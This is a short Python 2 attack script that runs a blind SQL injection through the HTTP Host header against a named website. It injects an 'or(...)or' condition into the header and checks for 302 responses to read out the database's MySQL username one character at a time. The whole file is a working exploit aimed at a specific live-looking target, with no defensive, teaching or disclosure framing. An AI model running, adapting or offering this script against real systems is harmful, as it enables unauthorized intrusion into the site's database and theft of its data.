#!/usr/bin/env python
#encoding=gbk

import httplib
import time
import string
import sys
import random
import urllib

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',

}

payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

print 'start to retrive MySQL user:'

user = ''
for i in range(1,15):
    for payload in payloads:
        conn = httplib.HTTPConnection('jpht.tianxun.com', timeout=60)
        s = "ascii(mid(lower(user()),%s,1))=%s" % (i, ord(payload))
        headers['HOST'] = "www.baidu.com'or(%s)or'" % s
        conn.request(method='GET',
                     url='/',
                     headers = headers)
        start_time = time.time()
        status = conn.getresponse().status
        conn.close()
        if status == 302:
            user += payload
            print '\n[Scan in progress]', user
        else:
            print '.',

print '\n[Done]MySQL user is', user
